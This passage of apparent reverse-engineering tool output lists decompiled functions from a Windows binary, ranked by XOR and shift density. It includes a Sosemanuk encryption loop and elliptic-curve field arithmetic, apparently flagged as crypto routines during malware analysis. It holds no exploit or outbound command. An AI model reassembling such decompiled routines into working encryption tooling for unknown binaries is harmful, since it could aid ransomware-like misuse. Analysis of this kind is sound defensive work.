+ (v1214 ^ v702 & -(v705 & 1));\n        v710 = v702 ^ Sosemanuk_140066428[(unsigned __int8)v1215] ^ Sosemanuk_140066028[HIBYTE(v1212)] ^ (v1215 >> 8) ^ (v1212 << 8);\n        v711 = __ROL4__(v708, 7);\n        v712 = v711 ^ (v709 + v710);\n        v713 = 1415926535 * v709;\n        v714 = v711 + (v1215 ^ v710 & -(v709 & 1));\n        v715 = v1217;\n        v716 = v710 ^ Sosemanuk_140066428[(unsigned __int8)v1216] ^ Sosemanuk_140066028[HIBYTE(v1213)] ^ (v1216 >> 8) ^ (v1213 << 8);\n        v717 = __ROL4__(v713, 7);\n        v718 = v717 ^ (v714 + v716);\n        v719 = v718 ^ v703 & v712;\n        v720 = v707 ^ (v703 | v718);\n        v721 = v719 ^ v707 ^ v712;\n        v722 = v721 ^ v703;\n        v723 = v719 ^ (v720 | v722);\n        v724 = v722 ^ v720 & v719;\n        v725 = Sosemanuk_140066428[(unsigned __int8)v1217] ^ Sosemanuk_140066028[HIBYTE(v1214)] ^ (v1217 >> 8) ^ (v1214 << 8);\n        v1103[0] = v1211 ^ v721;\n        v1103[1] = v723 ^ v1212;\n        v1103[2] = v723 ^ v724 ^ v1213 ^ v720;\n        v1103[3] = ~(v1214 ^ v724);\n        v726 = v1218;\n        v899 = v716;\n        v727 = v716 ^ v725;\n        v728 = sub_140009E66(v1210, 0i64, 16i64, &off_140066828);\n        sub_14001358C(v728, v729, v1103);\n        v730 = __ROL4__(1415926535 * v714, 7);\n        v920 = v726;\n        v731 = v717 + (v875 ^ v716 & -(v714 & 1));\n        v732 = v727 ^ Sosemanuk_140066428[(unsigned __int8)v726] ^ Sosemanuk_140066028[HIBYTE(v903)] ^ (v726 >> 8) ^ (v903 << 8);\n        v1032 = v727;\n        v733 = v730 ^ (v731 + v727);\n        v734 = __ROL4__(1415926535 * v731, 7);\n        v735 = v730 + (v715 ^ v727 & -(v731 & 1));\n        v736 = v732 ^ Sosemanuk_140066428[(unsigned __int8)v895] ^ Sosemanuk_140066028[HIBYTE(v875)] ^ (v895 >> 8) ^ (v875 << 8);\n        v871 = v732;\n        v737 = v734 ^ (v735 + v732);\n        v738 = __ROL4__(1415926535 * v735, 7);\n        v739 = v734 + (v920 ^ v732 & -(v735 & 1));\n        v867 = v736 ^ Sosemanuk_140066428[(unsigned __int8)v862] ^ Sosemanuk_140066028[HIBYTE(v715)] ^ (v862 >> 8) ^ (v715 << 8);\n        v740 = v738 ^ (v739 + v736);\n        v741 = __ROL4__(1415926535 * v739, 7);\n        v742 = Sosemanuk_140066428[(unsigned __int8)v702] ^ Sosemanuk_140066028[HIBYTE(v920)] ^ (v702 >> 8) ^ (v920 << 8);\n        v743 = v738 + (v895 ^ v736 & -(v739 & 1));\n        v744 = v741 ^ (v743 + v867);\n        v745 = v744 ^ v733 & v740;\n        v746 = v745 ^ v737 ^ v740;\n        v747 = v737 ^ (v733 | v744);\n        v748 = v746 ^ v733;\n        v749 = v745 ^ (v747 | v748);\n        v750 = v748 ^ v747 & v745;\n        v1104[0] = v903 ^ v746;\n        v1104[1] = v875 ^ v749;\n        v1104[2] = v749 ^ v750 ^ v715 ^ v747;\n        v1104[3] = ~(v920 ^ v750);\n        v751 = sub_140009E66(v1210, 16i64, 32i64, &off_140066840);\n        sub_14001358C(v751, v752, v1104);\n        v753 = __ROL4__(1415926535 * v743, 7);\n        v754 = v741 + (v862 ^ v867 & -(v743 & 1));\n        v755 = v867 ^ v742;\n        v756 = v867 ^ v742 ^ Sosemanuk_140066428[(unsigned __int8)v710] ^ Sosemanuk_140066028[HIBYTE(v895)] ^ (v710 >> 8) ^ (v895 << 8);\n        v757 = v755;\n        v876 = v755;\n        v758 = v753 ^ (v754 + v755);\n        v759 = __ROL4__(1415926535 * v754, 7);\n        v760 = v753 + (v702 ^ v757 & -(v754 & 1));\n        v761 = v756 ^ Sosemanuk_140066428[(unsigned __int8)v899] ^ Sosemanuk_140066028[HIBYTE(v862)] ^ (v899 >> 8) ^ (v862 << 8);\n        v925 = v756;\n        v762 = v759 ^ (v760 + v756);\n        v763 = __ROL4__(1415926535 * v760, 7);\n        v764 = v759 + (v710 ^ v756 & -(v760 & 1));\n        v765 = v761 ^ Sosemanuk_140066428[(unsigned __int8)v1032] ^ Sosemanuk_140066028[HIBYTE(v702)] ^ (v1032 >> 8) ^ (v702 << 8);\n        v904 = v761;\n        v766 = v763 ^ (v764 + v761);\n        v767 = 1415926535 * v764;\n        v768 = v716 ^ v761 & -(v764 & 1);\n        v769 = __ROL4__(v767, 7);\n        v770 = Sosemanuk_140066428[(unsigned __int8)v871] ^ Sosemanuk_140066028[HIBYTE(v710)] ^ (v871 >> 8) ^ (v710 << 8);\n        v771 = v763 + v768;\n        v772 = v769 ^ (v771 + v765);\n        v773 = v772 ^ v758 & v766;\n        v774 = v773 ^ v762 ^ v766;\n        v775 = v762 ^ (v758 | v772);\n        v776 = v774 ^ v758;\n        v777 = v773 ^ (v775 | v776);\n        v778 = v776 ^ v775 & v773;\n        v1105[0] = v895 ^ v774;\n        v1105[1] = v862 ^ v777;\n        v1105[2] = v777 ^ v778 ^ v702 ^ v775;\n        v1105[3] = ~(v710 ^ v778);\n        v779 = v765 ^ v770;\n        v780 = v765;\n        v921 = v765;\n        v781 = sub_140009E66(v1210, 32i64, 48i64, &off_140066858);\n        sub_14001358C(v781, v782, v1105);\n        v783 = __ROL4__(1415926535 * v771, 7);\n        v784 = v769 + (v1032 ^ v780 & -(v771 & 1));\n        v785 = v779 ^ Sosemanuk_140066428[(unsigned __int8)v736] ^ Sosemanuk_140066028[HIBYTE(v899)] ^ (v736 >> 8) ^ (v899 << 8);\n        v863 = v779;\n        v786 = v783 ^ (v784 + v779);\n        v787 = __ROL4__(1415926535 * v784, 7);\n        v788 = v783 + (v871 ^ v779 & -(v784 & 1));\n        v789 = v785 ^ Sosemanuk_140066428[(unsigned __int8)v867] ^ Sosemanuk_140066028[HIBYTE(v1032)] ^ (v867 >> 8) ^ (v1032 << 8);\n        v896 = v785;\n        v790 = v787 ^ (v788 + v785);\n        v791 = __ROL4__(1415926535 * v788, 7);\n        v792 = v787 + (v736 ^ v785 & -(v788 & 1));\n        v793 = v789 ^ Sosemanuk_140066428[(unsigned __int8)v876] ^ Sosemanuk_140066028[HIBYTE(v871)] ^ (v876 >> 8) ^ (v871 << 8);\n        v1025 = v789;\n        v794 = v791 ^ (v792 + v789);\n        v892 = __ROL4__(1415926535 * v792, 7);\n        v795 = Sosemanuk_140066428[(unsigned __int8)v925] ^ Sosemanuk_140066028[HIBYTE(v736)] ^ (v925 >> 8) ^ (v736 << 8);\n        v796 = v791 + (v867 ^ v789 & -(v792 & 1));\n        v797 = v892 ^ (v796 + v793);\n        v798 = v797 ^ v786 & v794;\n        v799 = v798 ^ v790 ^ v794;\n        v800 = v790 ^ (v786 | v797);\n        v801 = v799 ^ v786;\n        v802 = v798 ^ (v800 | v801);\n        v803 = v801 ^ v800 & v798;\n        v1106[0] = v899 ^ v799;\n        v1106[1] = v802 ^ v1032;\n        v1106[2] = v802 ^ v803 ^ v871 ^ v800;\n        v1106[3] = ~(v736 ^ v803);\n        v1067 = v793;\n        v804 = v793 ^ v795;\n        v805 = sub_140009E66(v1210, 48i64, 64i64, &off_140066870);\n        sub_14001358C(v805, v806, v1106);\n        v900 = __ROL4__(1415926535 * v796, 7);\n        v807 = v892 + (v876 ^ v793 & -(v796 & 1));\n        v808 = v804 ^ Sosemanuk_140066428[(unsigned __int8)v904] ^ Sosemanuk_140066028[HIBYTE(v867)] ^ (v904 >> 8) ^ (v867 << 8);\n        v809 = v807 + v804;\n        v810 = 1415926535 * v807;\n        v811 = v900 + (v925 ^ v804 & -(v807 & 1));\n        v812 = __ROL4__(v810, 7);\n        v813 = v808 ^ Sosemanuk_140066428[(unsigned __int8)v921] ^ Sosemanuk_140066028[HIBYTE(v876)] ^ (v921 >> 8) ^ (v876 << 8);\n        v814 = v811 + v808;\n        v815 = 1415926535 * v811;\n        v816 = v812 + (v904 ^ v808 & -(v811 & 1));\n        v817 = __ROL4__(v815, 7);\n        v818 = v816 + v813;\n        v872 = 1415926535 * v816;\n        v819 = v817 + (v921 ^ v813 & -(v816 & 1));\n        v820 = v817 ^ v818;\n        v821 = __ROL4__(v872, 7);\n        v822 = v812 ^ v814;\n        v823 = v813 ^ Sosemanuk_140066428[(unsigned __int8)v863] ^ Sosemanuk_140066028[HIBYTE(v925)] ^ (v925 << 8) ^ (v863 >> 8);\n        v824 = Sosemanuk_140066428[(unsigned __int8)v896] ^ Sosemanuk_140066028[HIBYTE(v904)] ^ (v896 >> 8) ^ (v904 << 8);\n        v825 = v900 ^ v809;\n        v826 = v821 ^ (v819 + v823);\n        v827 = v821;\n        v828 = v826 ^ v825 & v820;\n        v829 = v828 ^ v822 ^ v820;\n        v830 = v822 ^ (v825 | v826);\n        v831 = v829 ^ v825;\n        v832 = v828 ^ (v830 | v831);\n        v833 = v831 ^ v830 & v828;\n        LODWORD(v1111) = v867 ^ v829;\n        DWORD1(v1111) = v832 ^ v876;\n        DWORD2(v1111) = v832 ^ v833 ^ v925 ^ v830;\n        HIDWORD(v1111) = ~(v904 ^ v833);\n        v834 = sub_140009E66(v1210, 64i64, 80i64, &off_140066888);\n        sub_14001358C(v834, v835, &v1111);\n        v699 = 0i64;\n        v698 = v853;\n        v697 = v1029;\n        v1211 = v921;\n        v1212 = v863;\n        v1213 = v896;\n        v1214 = v1025;\n        v1215 = v1067;\n        v1216 = v804;\n        v1217 = v808;\n        v693 = v1064;\n        v1218 = v813;\n        v1219 = v823;\n        v1220 = v823 ^ v824;\n        v1221 = __PAIR64__(v827, v819);\n        v695 = v1061;\n        v1222 = 0;\n        v836 = 0;\n      }\n      else\n      {\n        if ( v1222 >= 0x50 )\n          sub_14005DDC0(v1222, 80i64, &off_1400668A0);\n        v836 = v1222;\n      }\n      v837 = v1210[v699] ^ v698;\n      v1222 = v836 + 1;\n      *(_BYTE *)(v1036 + v697++) = v837;\n    }\n    v690 = v1108;\n    v691 = v1109;\n    *(_QWORD *)&v838 = sub_14001B65A(0, v1058, (unsigned int)v1223, 4096, (__int64)&off_1400681E8);\n    v1111 = v838;\n    *(_QWORD *)&v1112 = 0i64;\n    v839 = sub_14001B60D(&v1111, *((_QWORD *)&v838 + 1));\n    v841 = v840;\n    sub_14004DE13(v1102);\n    v842 = *(_QWORD *)&v1102[16];\n    if ( v841 )\n    {\n      v843 = *(_QWORD *)v1102;\n      for ( i = 0i64; i != v841; ++i )\n        *(_BYTE *)(v843 + v842++) = *(_BYTE *)(v839 + i);\n    }\n    *(_QWORD *)&v1102[16] = v842;\n  }\n  while ( v691 != v690 );\n  result = *(_QWORD *)&v1102[16];\n  v846 = (_OWORD *)v1110;\n  *(_QWORD *)(v1110 + 16) = *(_QWORD *)&v1102[16];\n  *v846 = *(_OWORD *)v1102;\n  return result;\n}\n// 140017961: variable 'v9' is possibly undefined\n// 14001798B: variable 'v11' is possibly undefined\n// 14001A3ED: variable 'v694' is possibly undefined\n// 14001A427: variable 'v696' is possibly undefined\n// 14001A6B4: variable 'v729' is possibly undefined\n// 14001A8ED: variable 'v752' is possibly undefined\n// 14001AB07: variable 'v782' is possibly undefined\n// 14001AD11: variable 'v806' is possibly undefined\n// 14001AF1B: variable 'v835' is possibly undefined\n// 14001B02B: variable 'v838' is possibly undefined\n// 14001B054: variable 'v840' is possibly undefined\n// 140009D8D: using guessed type __int64 __fastcall sub_140009D8D(_QWORD, _QWORD, _QWORD);\n// 140009DAC: using guessed type __int64 __fastcall sub_140009DAC(_QWORD, _QWORD, _QWORD, _QWORD);\n// 140009DE4: using guessed type __int64 __fastcall sub_140009DE4(_QWORD, _QWORD, _QWORD, _QWORD);\n// 140009E06: using guessed type __int64 __fastcall sub_140009E06(_QWORD, _QWORD, _QWORD, _QWORD);\n// 140009E66: using guessed type __int64 __fastcall sub_140009E66(_QWORD, _QWORD, _QWORD, _QWORD);\n// 14001358C: using guessed type __int64 __fastcall sub_14001358C(_QWORD, _QWORD, _QWORD);\n// 1400135C9: using guessed type __int64 __fastcall sub_1400135C9(_QWORD);\n// 14001B60D: using guessed type __int64 __fastcall sub_14001B60D(_QWORD, _QWORD);\n// 14001B65A: using guessed type __int64 __fastcall sub_14001B65A(_DWORD, _DWORD, _DWORD, _DWORD, __int64);\n// 14004DE13: using guessed type __int64 __fastcall sub_14004DE13(_QWORD);\n// 14005D820: using guessed type __int64 __fastcall sub_14005D820(_QWORD, _QWORD, _QWORD);\n// 14005DDC0: using guessed type void __fastcall __noreturn sub_14005DDC0(_QWORD, _QWORD, _QWORD);\n// 14005DEC0: using guessed type void __fastcall __noreturn sub_14005DEC0(_QWORD, _QWORD, _QWORD);\n// 140066010: using guessed type void *off_140066010;\n// 140066028: using guessed type _DWORD Sosemanuk_140066028[256];\n// 140066428: using guessed type _DWORD Sosemanuk_140066428[256];\n// 140066828: using guessed type void *off_140066828;\n// 140066840: using guessed type void *off_140066840;\n// 140066858: using guessed type void *off_140066858;\n// 140066870: using guessed type void *off_140066870;\n// 140066888: using guessed type void *off_140066888;\n// 1400668A0: using guessed type void *off_1400668A0;\n// 1400668B8: using guessed type void *off_1400668B8;\n// 1400668D0: using guessed type void *off_1400668D0;\n// 1400668E8: using guessed type void *off_1400668E8;\n// 140066900: using guessed type void *off_140066900;\n// 140066918: using guessed type void *off_140066918;\n// 140066930: using guessed type void *off_140066930;\n// 140066948: using guessed type void *off_140066948;\n// 140066960: using guessed type void *off_140066960;\n// 140066978: using guessed type void *off_140066978;\n// 140066990: using guessed type void *off_140066990;\n// 1400669A8: using guessed type void *off_1400669A8;\n// 1400669C0: using guessed type void *off_1400669C0;\n// 1400669D8: using guessed type void *off_1400669D8;\n// 1400669F0: using guessed type void *off_1400669F0;\n// 140066A38: using guessed type void *off_140066A38;\n// 1400681D0: using guessed type void *off_1400681D0;\n// 1400681E8: using guessed type void *off_1400681E8;\n// 140017876: using guessed type char var_10E8[80];\n\n"
    },
    {
        "Function": "sub_140008945",
        "Total XOR and shift operations": 46,
        "XOR operations": 0,
        "Shift operations": 46,
        "Operation percentage": "49.46%",
        "Function Body": "\n__m128i *__fastcall sub_140008945(__m128i *a1, unsigned __int64 *a2)\n{\n  unsigned __int64 v2; // rax\n  unsigned __int64 v3; // r10\n  unsigned __int64 v4; // r9\n  unsigned __int64 v5; // r8\n  unsigned __int64 v6; // rdx\n  unsigned __int64 v7; // r11\n  unsigned __int64 v8; // rsi\n  unsigned __int64 v9; // rdi\n  unsigned __int64 v10; // rbx\n  __int64 v11; // r10\n  unsigned __int64 v12; // r9\n  unsigned __int64 v13; // r8\n  unsigned __int64 v14; // rdx\n  unsigned __int64 v15; // r11\n  unsigned __int64 v16; // rsi\n  unsigned __int64 v17; // rax\n  unsigned __int64 v18; // r13\n  unsigned __int64 v19; // r15\n  __m128i v20; // xmm0\n  __m128i v21; // xmm3\n  __m128i *result; // rax\n\n  v2 = *a2;\n  v3 = a2[1];\n  v4 = a2[2];\n  v5 = a2[3];\n  v6 = a2[4];\n  v7 = v3 >> 51;\n  v8 = v4 >> 51;\n  v9 = v5 >> 51;\n  v10 = v6 >> 51;\n  v11 = (v2 >> 51) + (v3 & 0x7FFFFFFFFFFFFi64);\n  v12 = v7 + (v4 & 0x7FFFFFFFFFFFFi64);\n  v13 = v8 + (v5 & 0x7FFFFFFFFFFFFi64);\n  v14 = v9 + (v6 & 0x7FFFFFFFFFFFFi64);\n  v15 = 19 * v10\n      + (v2 & 0x7FFFFFFFFFFFFi64)\n      + 19\n      * ((v14 + ((v13 + ((v12 + ((v11 + ((19 * v10 + (v2 & 0x7FFFFFFFFFFFFi64) + 19) >> 51)) >> 51)) >> 51)) >> 51)) >> 51);\n  v16 = v11 + (v15 >> 51);\n  v17 = v12 + (v16 >> 51);\n  v18 = v13 + (v17 >> 51);\n  v19 = v14 + (v18 >> 51);\n  v20 = _mm_unpacklo_epi64(\n          _mm_unpacklo_epi32(\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v17 >> 26), _mm_cvtsi32_si128(v17 >> 34)),\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v17 >> 42), _mm_cvtsi32_si128(((v17 >> 50) & 1) + 2 * v18))),\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(\n                _mm_cvtsi32_si128(((unsigned int)v13 + (v17 >> 51)) >> 7),\n                _mm_cvtsi32_si128(((unsigned int)v13 + (v17 >> 51)) >> 15)),\n              _mm_unpacklo_epi8(\n                _mm_cvtsi32_si128(((unsigned int)v13 + (v17 >> 51)) >> 23),\n                _mm_cvtsi32_si128(v18 >> 31)))),\n          _mm_unpacklo_epi32(\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v18 >> 39), _mm_cvtsi32_si128((v18 >> 47) & 0xF | (16 * v19))),\n              _mm_unpacklo_epi8(\n                _mm_cvtsi32_si128(((unsigned int)v14 + (v18 >> 51)) >> 4),\n                _mm_cvtsi32_si128((unsigned int)v19 >> 12))),\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128((unsigned int)v19 >> 20), _mm_cvtsi32_si128(v19 >> 28)),\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v19 >> 36), _mm_cvtsi32_si128((v19 >> 44) & 0x7F)))));\n  v21 = _mm_unpacklo_epi64(\n          _mm_unpacklo_epi32(\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v15), _mm_cvtsi32_si128((unsigned int)v15 >> 8)),\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(WORD1(v15)), _mm_cvtsi32_si128(BYTE3(v15)))),\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(HIDWORD(v15)), _mm_cvtsi32_si128(v15 >> 40)),\n              _mm_unpacklo_epi8(\n                _mm_cvtsi32_si128((HIWORD(v15) & 7) + 8 * v16),\n                _mm_cvtsi32_si128((unsigned int)v16 >> 5)))),\n          _mm_unpacklo_epi32(\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128((unsigned int)v16 >> 13), _mm_cvtsi32_si128((unsigned int)v16 >> 21)),\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128(v16 >> 29), _mm_cvtsi32_si128(v16 >> 37))),\n            _mm_unpacklo_epi16(\n              _mm_unpacklo_epi8(\n                _mm_cvtsi32_si128((v16 >> 45) & 0x3F | ((_DWORD)v17 << 6)),\n                _mm_cvtsi32_si128((unsigned int)v17 >> 2)),\n              _mm_unpacklo_epi8(_mm_cvtsi32_si128((unsigned int)v17 >> 10), _mm_cvtsi32_si128((unsigned int)v17 >> 18)))));\n  result = a1;\n  *a1 = v21;\n  a1[1] = v20;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_1400096C9",
        "Total XOR and shift operations": 10,
        "XOR operations": 10,
        "Shift operations": 0,
        "Operation percentage": "40.00%",
        "Function Body": "\n__int64 __fastcall sub_1400096C9(__int64 *a1, _QWORD *a2, _QWORD *a3, unsigned __int8 a4)\n{\n  __int64 result; // rax\n  __int64 v5; // r9\n  __int64 v6; // r10\n  __int64 v7; // rsi\n  __int64 v8; // rdi\n  __int64 v9; // r8\n\n  result = -(__int64)a4;\n  v5 = *a2 ^ result & (*a2 ^ *a3);\n  v6 = a2[1] ^ result & (a2[1] ^ a3[1]);\n  v7 = a2[2] ^ result & (a2[2] ^ a3[2]);\n  v8 = a2[3] ^ result & (a2[3] ^ a3[3]);\n  v9 = a2[4] ^ result & (a2[4] ^ a3[4]);\n  *a1 = v5;\n  a1[1] = v6;\n  a1[2] = v7;\n  a1[3] = v8;\n  a1[4] = v9;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_140007D20",
        "Total XOR and shift operations": 20,
        "XOR operations": 3,
        "Shift operations": 17,
        "Operation percentage": "24.69%",
        "Function Body": "\nunsigned __int64 __fastcall sub_140007D20(__int64 a1, unsigned __int64 a2)\n{\n  unsigned __int64 result; // rax\n  unsigned __int64 v4; // rcx\n  int v5; // ecx\n  __int64 v6; // rdi\n  unsigned __int64 v7; // r10\n  unsigned __int64 v8; // r11\n  unsigned __int128 v9; // kr00_16\n  int v10; // edx\n  __int64 v11; // rcx\n  unsigned __int64 v12; // rax\n  unsigned __int64 v13; // r9\n  __int128 v14; // rdi\n  unsigned __int64 v15; // rcx\n  unsigned __int64 v16; // rax\n  unsigned __int64 v17; // rcx\n  __int64 v18; // r8\n\n  result = 0i64;\n  if ( a1 >= -342 && a2 )\n  {\n    if ( a1 > 308 )\n      return 0i64;\n    _BitScanReverse64(&v4, a2);\n    v5 = v4 ^ 0x3F;\n    v6 = 16 * (a1 + 342);\n    v9 = *(unsigned __int64 *)((char *)&unk_140062F28 + v6) * (unsigned __int128)(a2 << v5);\n    v8 = *((_QWORD *)&v9 + 1);\n    v7 = v9;\n    if ( (~WORD4(v9) & 0x1FF) == 0 )\n    {\n      v8 = (((*(unsigned __int64 *)((char *)&unk_140062F28 + v6 + 8) * (unsigned __int128)(a2 << v5)) >> 64) + v9) >> 64;\n      v7 = ((*(unsigned __int64 *)((char *)&unk_140062F28 + v6 + 8) * (unsigned __int128)(a2 << v5)) >> 64) + v9;\n    }\n    if ( (unsigned __int64)(a1 + 27) >= 0x53 && v7 == -1i64 )\n    {\n      return 0i64;\n    }\n    else\n    {\n      v10 = (v8 >> 63) + ((217706 * (int)a1) >> 16) - v5 + 63;\n      v11 = (v8 >> 63) + 9;\n      v12 = v8 >> v11;\n      if ( v10 >= -1022 )\n      {\n        v13 = a1 + 4;\n        *((_QWORD *)&v14 + 1) = (v8 >> v11) & 3 ^ 1;\n        *(_QWORD *)&v14 = v8 ^ (v12 << v11);\n        v15 = v12 & 0xFFFFFFFFFFFFFFFEui64;\n        if ( v14 != 0 )\n          v15 = v12;\n        if ( v7 >= 2 )\n          v15 = v12;\n        if ( v13 >= 0x1C )\n          v15 = v12;\n        v16 = v15 + (v15 & 1);\n        v17 = v16 >> 54;\n        if ( v10 - ((unsigned int)(v16 >> 54 == 0) - 1) + 1023 > 0x7FE )\n          return 0i64;\n        v18 = (v16 >> 1) & 0xEFFFFFFFFFFFFFi64;\n        result = 0i64;\n        if ( !v17 )\n          return v18;\n      }\n      else if ( (unsigned int)v10 >= 0xFFFFFBC3 )\n      {\n        return (_bittest64((const __int64 *)&v12, (unsigned int)(2 - v10)) + (v12 >> (2 - (unsigned __int8)v10))) >> 1;\n      }\n      else\n      {\n        return 0i64;\n      }\n    }\n  }\n  return result;\n}\n// 140007D60: conditional instruction was optimized away because rdx.8!=0\n\n"
    },
    {
        "Function": "sub_14002B7A8",
        "Total XOR and shift operations": 8,
        "XOR operations": 0,
        "Shift operations": 8,
        "Operation percentage": "20.00%",
        "Function Body": "\nunsigned __int64 __fastcall sub_14002B7A8(unsigned __int64 a1, unsigned __int64 a2)\n{\n  __int128 v2; // rt0\n  __int64 v4; // r10\n  __int64 v5; // r11\n  __int64 v6; // rdi\n  __int64 v7; // rax\n  bool v8; // cf\n  __int64 v9; // rax\n  __int128 v10; // rt0\n\n  if ( a2 >= 0x80000 )\n  {\n    v4 = (0x9598F4F1E8361973ui64 * (unsigned __int128)a1) >> 64;\n    v5 = (0x760F253EDB4AB0D2i64 * (unsigned __int128)a1) >> 64;\n    v6 = (0x9598F4F1E8361973ui64 * (unsigned __int128)a2) >> 64;\n    v7 = v5 + __CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1) + 0x760F253EDB4AB0D2i64 * a2;\n    v8 = __CFADD__(\n           __CFADD__(\n             0x9598F4F1E8361973ui64 * a2,\n             (__PAIR128__(0x760F253EDB4AB0D2i64, 0x9598F4F1E8361973ui64) * a1) >> 64),\n           v7);\n    v9 = __CFADD__(0x9598F4F1E8361973ui64 * a2, (__PAIR128__(0x760F253EDB4AB0D2i64, 0x9598F4F1E8361973ui64) * a1) >> 64)\n       + v7;\n    *(_QWORD *)&v10 = v6 + v9;\n    *((_QWORD *)&v10 + 1) = (v8 | (unsigned __int8)__CFADD__(v6, v9))\n                          + (__CFADD__(__CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1), 0x760F253EDB4AB0D2i64 * a2) | (unsigned __int8)__CFADD__(v5, __CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1) + 0x760F253EDB4AB0D2i64 * a2))\n                          + ((0x760F253EDB4AB0D2i64 * (unsigned __int128)a2) >> 64);\n    return v10 >> 62;\n  }\n  else\n  {\n    *((_QWORD *)&v2 + 1) = a2;\n    *(_QWORD *)&v2 = a1;\n    return (unsigned __int64)(v2 >> 19) / 0x1158E460913Di64;\n  }\n}\n\n"
    },
    {
        "Function": "sub_14004EA68",
        "Total XOR and shift operations": 6,
        "XOR operations": 5,
        "Shift operations": 1,
        "Operation percentage": "20.00%",
        "Function Body": "\n__int64 sub_14004EA68()\n{\n  uintptr_t v0; // rax\n  __int64 result; // rax\n  unsigned __int64 v2; // [rsp+20h] [rbp-10h] BYREF\n  struct _FILETIME SystemTimeAsFileTime; // [rsp+40h] [rbp+10h] BYREF\n  LARGE_INTEGER PerformanceCount; // [rsp+48h] [rbp+18h] BYREF\n\n  v0 = _security_cookie;\n  if ( _security_cookie == 0x2B992DDFA232i64 )\n  {\n    SystemTimeAsFileTime = 0i64;\n    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);\n    v2 = (unsigned __int64)SystemTimeAsFileTime;\n    v2 ^= GetCurrentThreadId();\n    v2 ^= GetCurrentProcessId();\n    QueryPerformanceCounter(&PerformanceCount);\n    v0 = ((unsigned __int64)&v2 ^ v2 ^ PerformanceCount.QuadPart ^ ((unsigned __int64)PerformanceCount.LowPart << 32)) & 0xFFFFFFFFFFFFi64;\n    if ( v0 == 0x2B992DDFA232i64 )\n      v0 = 0x2B992DDFA233i64;\n    _security_cookie = v0;\n  }\n  result = ~v0;\n  qword_140087100 = result;\n  return result;\n}\n// 140087100: using guessed type __int64 qword_140087100;\n\n"
    },
    {
        "Function": "sub_14004D930",
        "Total XOR and shift operations": 2,
        "XOR operations": 1,
        "Shift operations": 1,
        "Operation percentage": "20.00%",
        "Function Body": "\nchar __fastcall sub_14004D930(unsigned __int16 a1)\n{\n  if ( a1 )\n    return (((a1 + 393206) & (a1 + 524188) ^ (a1 + 916504) & ((unsigned int)a1 + 514288)) >> 17) + 1;\n  else\n    return 1;\n}\n\n"
    },
    {
        "Function": "sub_140003B10",
        "Total XOR and shift operations": 6,
        "XOR operations": 1,
        "Shift operations": 5,
        "Operation percentage": "18.75%",
        "Function Body": "\nunsigned __int64 __fastcall sub_140003B10(__int64 a1, unsigned int a2)\n{\n  unsigned int v2; // eax\n  unsigned __int64 result; // rax\n  __int64 v4; // [rsp+2Eh] [rbp-Ah]\n  __int16 v5; // [rsp+36h] [rbp-2h]\n\n  BYTE2(v4) = 0;\n  LOWORD(v4) = 0;\n  HIBYTE(v5) = 125;\n  BYTE3(v4) = a0123456789abcd[(a2 >> 20) & 0xF];\n  BYTE4(v4) = a0123456789abcd[HIWORD(a2) & 0xF];\n  BYTE5(v4) = a0123456789abcd[(unsigned __int16)a2 >> 12];\n  BYTE6(v4) = a0123456789abcd[(a2 >> 8) & 0xF];\n  HIBYTE(v4) = a0123456789abcd[(unsigned __int8)a2 >> 4];\n  LOBYTE(v5) = a0123456789abcd[a2 & 0xF];\n  _BitScanReverse(&v2, a2 | 1);\n  result = ((v2 ^ 0x1C) >> 2) - 2i64;\n  if ( result >= 0xB )\n    sub_14005DD40(result, 10i64, (__int64)&off_140062EF8);\n  *((_BYTE *)&v4 + result + 2) = 123;\n  *(_WORD *)((char *)&v4 + result) = 30044;\n  *(_WORD *)(a1 + 8) = v5;\n  *(_QWORD *)a1 = v4;\n  *(_BYTE *)(a1 + 10) = result;\n  *(_BYTE *)(a1 + 11) = 10;\n  return result;\n}\n// 140062EF8: using guessed type char *off_140062EF8;\n\n"
    },
    {
        "Function": "sub_140008D0A",
        "Total XOR and shift operations": 23,
        "XOR operations": 0,
        "Shift operations": 23,
        "Operation percentage": "16.91%",
        "Function Body": "\n__int64 __fastcall sub_140008D0A(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)\n{\n  unsigned __int64 v3; // r12\n  unsigned __int64 v4; // rbp\n  __int128 v5; // rdi\n  __int128 v6; // kr10_16\n  unsigned __int64 v7; // r8\n  signed __int128 v8; // kr30_16\n  __int64 v9; // r9\n  unsigned __int64 v10; // rbx\n  __int64 v11; // r10\n  unsigned __int64 v12; // r14\n  __int64 v13; // r11\n  unsigned __int64 v14; // rbp\n  unsigned __int64 v15; // r12\n  unsigned __int64 v16; // r13\n  unsigned __int64 v17; // r15\n  signed __int128 v18; // kr50_16\n  signed __int128 v19; // kr60_16\n  signed __int128 v20; // kr70_16\n  unsigned __int64 v21; // r14\n  __int64 result; // rax\n  unsigned __int64 v23; // [rsp+0h] [rbp-150h]\n  unsigned __int128 v24; // [rsp+0h] [rbp-150h]\n  unsigned __int64 v25; // [rsp+8h] [rbp-148h]\n  unsigned __int64 v26; // [rsp+10h] [rbp-140h]\n  unsigned __int64 v27; // [rsp+10h] [rbp-140h]\n  unsigned __int64 v28; // [rsp+18h] [rbp-138h]\n  unsigned __int64 v29; // [rsp+20h] [rbp-130h]\n  unsigned __int64 v30; // [rsp+28h] [rbp-128h]\n  unsigned __int64 v31; // [rsp+30h] [rbp-120h]\n  unsigned __int64 v32; // [rsp+40h] [rbp-110h]\n  __int64 v33; // [rsp+50h] [rbp-100h]\n  __int64 v34; // 